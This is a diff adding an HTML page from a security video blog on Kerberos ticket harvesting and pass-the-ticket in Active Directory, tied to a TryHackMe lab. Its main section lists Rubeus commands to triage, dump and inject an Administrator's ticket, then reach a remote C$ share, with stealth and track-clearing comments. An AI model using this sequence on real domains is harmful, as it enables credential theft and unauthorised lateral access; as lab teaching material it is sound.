@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kerberos Attacks Part 2: Ticket Harvesting and Pass-the-Ticket, m0rn1ngstr</title>
+  <meta name="description" content="Ticket harvesting with Rubeus and pass-the-ticket attacks explained, with OPSEC considerations for stealthy Kerberos abuse in Active Directory." />
+  <link rel="stylesheet" href="../style.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css" />
+  <style>
+    .cmd-block { background:var(--surface); border:0.5px solid var(--border); border-radius:8px; overflow:hidden; margin-bottom:12px; }
+    .cmd-header { display:flex; justify-content:space-between; align-items:center; padding:7px 14px; border-bottom:0.5px solid var(--border); background:var(--surface2); }
+    .cmd-label { font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text-muted); }
+    .cmd-copy { font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--mint); background:none; border:none; cursor:pointer; opacity:0.7; letter-spacing:0.5px; }
+    .cmd-copy:hover { opacity:1; }
+    .cmd-body { padding:12px 14px; font-family:'JetBrains Mono',monospace; font-size:12px; line-height:1.7; color:var(--mint); overflow-x:auto; white-space:pre-wrap; word-break:break-all; }
+    .cmd-comment { color:var(--text-muted); }
+    .lab-card { background:var(--surface); border:0.5px solid var(--border); border-radius:8px; padding:10px 12px; margin-bottom:7px; text-decoration:none; display:block; transition:border-color 0.2s; }
+    .lab-card:hover { border-color:var(--red); }
+    .res-link { display:flex; align-items:center; gap:8px; padding:8px 10px; border-radius:6px; border:0.5px solid var(--border); margin-bottom:6px; text-decoration:none; transition:border-color 0.2s; background:var(--surface); }
+    .res-link:hover { border-color:var(--purple); }
+    a.card, a.card:visited { color:var(--text); }
+    .attack-divider { display:flex; align-items:center; gap:12px; margin:2rem 0 1.5rem; }
+    .attack-divider-label { font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--red); letter-spacing:2px; text-transform:uppercase; white-space:nowrap; }
+    .attack-divider-line { flex:1; height:0.5px; background:var(--border); }
+    .ref-table { width:100%; border-collapse:collapse; margin-bottom:1rem; font-size:12px; }
+    .ref-table td { padding:8px 10px; border-bottom:0.5px solid var(--border); vertical-align:top; }
+    .ref-table td:first-child { font-family:'JetBrains Mono',monospace; color:var(--mint); white-space:nowrap; padding-right:16px; }
+    .ref-table td:last-child { color:var(--text-muted); line-height:1.5; }
+    .opsec-note { background:var(--surface); border:0.5px solid var(--red-border); border-left:2px solid var(--red); border-radius:6px; padding:12px 14px; margin-bottom:1.5rem; font-size:13px; color:var(--text-muted); line-height:1.6; }
+    .opsec-note strong { color:var(--text); font-weight:500; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../index.html">m0rn1ngstr<span>.</span></a>
+  <div class="nav-links">
+    <a href="../about.html">about</a>
+    <a href="../videos.html" class="active">videos</a>
+    <a href="../work.html">work</a>
+  </div>
+</nav>
+
+<div style="padding:0.9rem 2rem; font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text-muted); border-bottom:0.5px solid var(--border); display:flex; align-items:center; gap:8px;">
+  <a href="../index.html" style="color:var(--text-muted); text-decoration:none;">home</a>
+  <span style="color:var(--red); opacity:0.5;">/</span>
+  <a href="../videos.html" style="color:var(--text-muted); text-decoration:none;">videos</a>
+  <span style="color:var(--red); opacity:0.5;">/</span>
+  <span style="color:var(--text);">kerberos-attacks-part2</span>
+</div>
+
+<div style="max-width:1060px; margin:0 auto; display:grid; grid-template-columns:1fr 280px; gap:0;">
+
+  <!-- MAIN -->
+  <main style="padding:2.5rem 2rem; border-right:0.5px solid var(--border);">
+
+    <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:1rem;">
+      <span class="badge badge-hof" style="font-size:11px; padding:4px 10px;">Active Directory</span>
+      <span class="badge badge-neutral" style="font-size:11px; padding:4px 10px;">Kerberos</span>
+      <span class="badge badge-purple" style="font-size:11px; padding:4px 10px;">Red Team</span>
+      <span class="badge badge-neutral" style="font-size:11px; padding:4px 10px;">OPSEC</span>
+    </div>
+
+    <h1 style="font-size:1.6rem; font-weight:300; line-height:1.2; letter-spacing:-0.5px; margin-bottom:0.4rem;">Kerberos Attacks Part 2: Ticket Harvesting and Pass-the-Ticket</h1>
+    <div style="font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--text-muted); margin-bottom:1.5rem;">// part 2 of the Kerberos series</div>
+
+    <!-- VIDEO THUMBNAIL -->
+    <a href="https://youtu.be/zXkzyYiD6xU" target="_blank"
+       style="display:block; width:100%; aspect-ratio:16/9; margin-bottom:2rem; border-radius:8px; overflow:hidden; border:0.5px solid var(--border); position:relative; text-decoration:none;">
+      <img src="https://img.youtube.com/vi/zXkzyYiD6xU/maxresdefault.jpg"
+           alt="Kerberos Attacks Part 2: Ticket Harvesting and Pass-the-Ticket"
+           style="width:100%; height:100%; object-fit:cover; display:block;">
+      <div style="position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.25);">
+        <div style="width:64px; height:64px; border-radius:50%; background:var(--red); display:flex; align-items:center; justify-content:center;">
+          <i class="ti ti-player-play" style="color:#fff; font-size:24px; margin-left:3px;"></i>
+        </div>
+      </div>
+    </a>
+
+    <div class="section-head">overview</div>
+    <p style="font-size:14px; line-height:1.75; color:var(--text-muted); margin-bottom:1rem;">
+      Part 2 of the Kerberos series, following the first video on Kerberoasting and AS-REP Roasting.
+      This time: <strong style="color:var(--text); font-weight:500;">ticket harvesting</strong> and
+      <strong style="color:var(--text); font-weight:500;">pass-the-ticket (PTT)</strong>, comparing
+      Rubeus and Mimikatz along the way.
+    </p>
+
+    <div class="opsec-note">
+      <strong>OPSEC note:</strong> lab runs with admin rights and no detection mechanisms, but the workflow
+      still follows OPSEC principles throughout.
+    </div>
+
+    <div style="height:0.5px; background:var(--border); margin:2rem 0;"></div>
+
+    <div class="section-head">commands used</div>
+
+    <!-- TICKET HARVESTING -->
+    <div class="attack-divider">
+      <span class="attack-divider-label">// ticket harvesting</span>
+      <div class="attack-divider-line"></div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">triage, overview of available tickets, no extraction yet</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `Rubeus.exe triage`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># overview first, dump later, triage keeps it quiet</span>
+Rubeus.exe triage</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">klist, detailed info on a cached ticket</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `Rubeus.exe klist`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># check encryption and flags before picking a target</span>
+Rubeus.exe klist</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">dump, extract a specific ticket by LUID and user</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `Rubeus.exe dump /luid:0x22edf8 /user:Administrator /nowrap`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># target the LUID from triage, nowrap for easy copy</span>
+Rubeus.exe dump /luid:&lt;ID&gt; /user:&lt;USERNAME&gt; /nowrap</div>
+    </div>
+
+    <div style="height:0.5px; background:var(--border); margin:2rem 0;"></div>
+
+    <!-- PASS THE TICKET -->
+    <div class="attack-divider">
+      <span class="attack-divider-label">// pass-the-ticket</span>
+      <div class="attack-divider-line"></div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">ptt, inject the harvested ticket into the current session</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `Rubeus.exe ptt /ticket:<BASE64_TICKET_FROM_DUMP>`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># paste the Base64EncodedTicket from the dump output above</span>
+Rubeus.exe ptt /ticket:&lt;BASE64_TICKET_FROM_DUMP&gt;</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">verify, access a remote host using the injected ticket</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `dir \\\\10.80.172.46\\c$`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># no password prompt, Kerberos auth goes through using the injected ticket</span>
+dir \\&lt;IP ADDRESS&gt;\c$</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">purge, clean up injected tickets when finished</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `Rubeus.exe purge`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># removes tickets from the current session, clears your tracks after the demo/engagement</span>
+Rubeus.exe purge</div>
+    </div>
+
+  </main>
+
+  <!-- SIDEBAR -->
+  <aside style="padding:2.5rem 1.5rem;">
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">lab to practice</div>
+      <a href="https://tryhackme.com/room/attackingkerberos" target="_blank" class="lab-card">
+        <div style="font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; margin-bottom:3px;">TryHackMe</div>
+        <div style="font-size:12px; font-weight:500; color:var(--text);">Attacking Kerberos</div>
+      </a>
+    </div>
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">resources</div>
+      <a href="https://attack.mitre.org/techniques/T1558/" target="_blank" class="res-link">
+        <i class="ti ti-external-link" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">MITRE ATT&CK, T1558</div>
+          <div style="font-size:11px; color:var(--text-muted);">Steal or Forge Kerberos Tickets</div>
+        </div>
+      </a>
+      <a href="https://attack.mitre.org/techniques/T1550/003/" target="_blank" class="res-link">
+        <i class="ti ti-external-link" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">MITRE ATT&CK, T1550.003</div>
+          <div style="font-size:11px; color:var(--text-muted);">Pass the Ticket</div>
+        </div>
+      </a>
+      <a href="https://github.com/GhostPack/Rubeus" target="_blank" class="res-link">
+        <i class="ti ti-tool" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">Rubeus</div>
+          <div style="font-size:11px; color:var(--text-muted);">github.com/GhostPack</div>
+        </div>
+      </a>
+      <a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html" target="_blank" class="res-link">
+        <i class="ti ti-book" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">HackTricks, AD Methodology</div>
+          <div style="font-size:11px; color:var(--text-muted);">hacktricks.wiki</div>
+        </div>
+      </a>
+    </div>
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">relevant certs</div>
+      <div style="display:flex; flex-wrap:wrap; gap:6px;">
+        <span class="cert-pill">OSCP</span>
+        <span class="cert-pill">OSEP</span>
+        <span class="cert-pill">CRTO</span>
+      </div>
+    </div>
+
+    <div>
+      <div class="section-head">more videos</div>
+      <a href="kerberos-attacks-part1.html" class="card" style="display:flex; gap:10px; align-items:flex-start; padding:10px; text-decoration:none; margin-bottom:7px;">
+        <div style="width:52px; height:36px; border-radius:4px; overflow:hidden; flex-shrink:0;">
+          <img src="https://img.youtube.com/vi/U1nMgb8AEB4/mqdefault.jpg"
+               style="width:100%; height:100%; object-fit:cover; display:block;">
+        </div>
+        <div>
+          <div style="font-family:'JetBrains Mono',monospace; font-size:9px; color:var(--red); letter-spacing:1px; text-transform:uppercase;">Active Directory · Kerberos</div>
+          <div style="font-size:11px; font-weight:500; color:var(--text); line-height:1.35; margin-top:2px;">Kerberos Attacks Part 1: User Enumeration, Kerberoasting and AS-REP Roasting</div>
+        </div>
+      </a>
+    </div>
+
+  </aside>
+</div>
+
+<footer>
+  <div class="footer-links">
+    <a href="https://youtube.com/@m0rn1ngstr" target="_blank"><i class="ti ti-brand-youtube"></i> YouTube</a>
+    <a href="https://x.com/m0rn1ngstr" target="_blank"><i class="ti ti-brand-x"></i> X</a>
+    <a href="https://www.linkedin.com/in/katerina-shevchenko01/" target="_blank"><i class="ti ti-brand-linkedin"></i> LinkedIn</a>
+  </div>
+  <span>// hello, friend. &copy; 2026 m0rn1ngstr</span>
+</footer>
+
+<script>
+  function copyCmd(btn, text) {
+    navigator.clipboard.writeText(text).then(() => {
+      const orig = btn.textContent;
+      btn.textContent = 'copied!';
+      setTimeout(() => btn.textContent = orig, 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
